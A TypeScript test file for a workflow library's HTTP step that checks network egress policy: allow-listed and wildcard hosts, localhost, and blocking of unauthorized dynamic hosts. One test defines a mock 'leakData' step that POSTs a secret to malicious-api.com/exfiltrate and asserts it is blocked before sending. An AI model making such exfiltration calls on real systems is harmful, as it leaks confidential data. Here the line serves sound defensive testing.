import { expect } from 'chai';
import { flow, networkPolicyStorage, NetworkPolicyViolationException } from '@siglo/core';
import { httpStep } from '../src/step';
import { createMockHttpServer } from '../src/testing/mock-agent';

describe('@siglo/http: ASL Network Egress Policy Enforcement', () => {
  let mockServer: ReturnType<typeof createMockHttpServer>;

  beforeEach(() => {
    mockServer = createMockHttpServer();
  });

  afterEach(() => {
    mockServer.restore();
  });

  it('allows outbound calls when host is authorized under active ASL policy', async () => {
    mockServer.get('https://api.stripe.com').intercept({ path: '/v1/charges', method: 'POST' })
      .reply(200, { id: 'ch_allowed', amount: 1000 });

    const chargeStep = httpStep('chargeCustomer', {
      url: 'https://api.stripe.com/v1/charges',
      method: 'POST',
      body: { amount: 1000 }
    });

    const workflow = flow(chargeStep).networkPolicy({
      allowedHosts: ['api.stripe.com'],
      defaultPolicy: 'deny'
    });

    const result = await workflow.run({});
    expect(result.id).to.equal('ch_allowed');
    expect(result.$httpMetadata.status).to.equal(200);
  });

  it('throws NetworkPolicyViolationException with phase: before when host is blocked', async () => {
    let networkCalled = false;
    mockServer.get('https://malicious-api.com').intercept({ path: '/exfiltrate', method: 'POST' })
      .reply(200, () => {
        networkCalled = true;
        return { ok: true };
      });

    const rogueStep = httpStep('leakData', {
      url: 'https://malicious-api.com/exfiltrate',
      method: 'POST',
      body: { secret: 'top_secret' }
    });

    const workflow = flow(rogueStep).networkPolicy({
      allowedHosts: ['api.stripe.com'],
      defaultPolicy: 'deny'
    });

    try {
      await workflow.run({});
      expect.fail('Expected workflow to throw NetworkPolicyViolationException');
    } catch (err: any) {
      expect(err.name).to.equal('NetworkPolicyViolationException');
      expect(err.phase).to.equal('before');
      expect(err.retryable).to.be.false;
      expect(err.requestedHost).to.equal('malicious-api.com');
      expect(networkCalled).to.be.false; // Pre-flight assertion: not a single byte left
    }
  });

  it('supports wildcard host pattern matching (e.g. *.stripe.com)', async () => {
    mockServer.get('https://api.stripe.com').intercept({ path: '/v1/balance', method: 'GET' })
      .reply(200, { available: 5000 });

    const balanceStep = httpStep('checkBalance', {
      url: 'https://api.stripe.com/v1/balance',
      method: 'GET'
    });

    const workflow = flow(balanceStep).networkPolicy({
      allowedHosts: ['*.stripe.com'],
      defaultPolicy: 'deny'
    });

    const res = await workflow.run({});
    expect(res.available).to.equal(5000);
  });

  it('permits localhost loopback by default when allowLocalhost is true', async () => {
    mockServer.get('http://localhost:3000').intercept({ path: '/health', method: 'GET' })
      .reply(200, { status: 'healthy' });

    const healthStep = httpStep('checkLocalService', {
      url: 'http://localhost:3000/health',
      method: 'GET'
    });

    const workflow = flow(healthStep).networkPolicy({
      allowedHosts: ['api.stripe.com'],
      defaultPolicy: 'deny',
      allowLocalhost: true
    });

    const res = await workflow.run({});
    expect(res.status).to.equal('healthy');
  });

  it('asserts network policy for dynamic URL resolved from context', async () => {
    mockServer.get('https://internal-service.local').intercept({ path: '/sync', method: 'GET' })
      .reply(200, { synced: true });

    const dynamicStep = httpStep('dynamicSync', {
      url: (ctx: any) => `https://${ctx.targetDomain}/sync`,
      method: 'GET'
    });

    // 1. Authorized dynamic host
    const authorizedFlow = flow(dynamicStep).networkPolicy({
      allowedHosts: ['internal-service.local'],
      defaultPolicy: 'deny'
    });
    const res = await authorizedFlow.run({ targetDomain: 'internal-service.local' });
    expect(res.synced).to.be.true;

    // 2. Unauthorized dynamic host
    try {
      await authorizedFlow.run({ targetDomain: 'unauthorized-target.com' });
      expect.fail('Expected dynamic call to be blocked');
    } catch (err: any) {
      expect(err.name).to.equal('NetworkPolicyViolationException');
      expect(err.phase).to.equal('before');
      expect(err.requestedHost).to.equal('unauthorized-target.com');
    }
  });

  it('automatically populates step network policy metadata from static URL', () => {
    const staticStep = httpStep('staticCall', {
      url: 'https://api.github.com/users/octocat',
      method: 'GET'
    });

    const policy = staticStep.networkPolicy();
    expect(policy?.enabled).to.be.true;
    expect(policy?.allowedHosts).to.deep.equal(['api.github.com']);
  });
});
